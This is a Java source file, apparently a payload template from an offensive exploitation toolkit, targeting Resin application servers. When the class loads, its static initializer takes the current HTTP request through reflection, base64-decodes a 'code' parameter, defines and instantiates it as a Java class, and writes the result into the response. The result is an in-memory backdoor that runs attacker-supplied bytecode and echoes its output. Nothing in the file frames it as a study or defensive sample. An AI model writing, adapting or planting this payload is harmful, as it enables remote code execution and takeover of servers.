package jeg.core.template.resin;

import java.io.Writer;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

public class ResinCodeExecTpl {
    static {
        try {
            new ResinCodeExecTpl();
        } catch (Exception e) {
        }
    }

    private String getReqParamName() {
        return "code";
    }

    ResinCodeExecTpl(){
        run();
    }

    private void run() {
        try {
            Object currentRequest = Thread.currentThread().getContextClassLoader().loadClass("com.caucho.server.dispatch.ServletInvocation").getMethod("getContextRequest").invoke(null);
            Field _responseF;
            if(currentRequest.getClass().getName().contains("com.caucho.server.http.HttpRequest")){
                // 3.x 需要从父类中获取
                _responseF = currentRequest.getClass().getSuperclass().getDeclaredField("_response");
            }else{
                _responseF = currentRequest.getClass().getDeclaredField("_response");
            }
            _responseF.setAccessible(true);

            Method getParameterM = currentRequest.getClass().getMethod("getParameter", String.class);
            String code = (String)getParameterM.invoke(currentRequest, getReqParamName());
            if(code != null & code != ""){
                Object response = _responseF.get(currentRequest);
                // 写入 body
                Method getWriterM = response.getClass().getMethod("getWriter");
                Writer writer = (Writer)getWriterM.invoke(response);
                writer.write(exec(code));

            }
//            // 写入 header
//            Method addHeaderM =  response.getClass().getMethod("addHeader",String.class, String.class);
//            addHeaderM.invoke(response,getRespHeaderName(),defineClazz(code));

        }catch (Exception e){

        }
    }


    private String exec(String var2) {
        try {
            byte[] clazzByte = base64Decode(var2);
            Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClass.setAccessible(true);
            Class clazz = (Class) defineClass.invoke(Thread.currentThread().getContextClassLoader(), clazzByte, 0, clazzByte.length);
            return clazz.newInstance().toString();
        } catch (Exception e) {
            return e.getMessage();
        }
    }

    private byte[] base64Decode(String str) throws Exception {
        try {
            Class clazz = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
        } catch (Exception var4) {
            Class clazz = Class.forName("java.util.Base64");
            Object decoder = clazz.getMethod("getDecoder").invoke((Object) null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
        }
    }
}
